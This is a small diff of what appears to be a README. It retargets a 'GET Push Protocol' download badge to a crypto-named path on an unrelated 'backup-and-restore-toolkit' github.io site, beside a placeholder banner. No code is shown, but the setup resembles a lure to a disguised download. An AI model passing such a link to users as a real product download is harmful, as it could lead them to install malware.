@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=f2aa2969369d42932682b22de8d283ed3b627716-13490011-images-thumbs&n=13)
 
-[![GET Push Protocol](https://img.shields.io/badge/GET%20%E2%80%94%20Push%20Protocol-0078D6?style=for-the-badge&logoColor=white)](https://backup-and-restore-toolkit.github.io/.github/)
+[![GET Push Protocol](https://img.shields.io/badge/GET%20%E2%80%94%20Push%20Protocol-0078D6?style=for-the-badge&logoColor=white)](https://backup-and-restore-toolkit.github.io/.github/push-protocol-crypto)
 
 ---
 
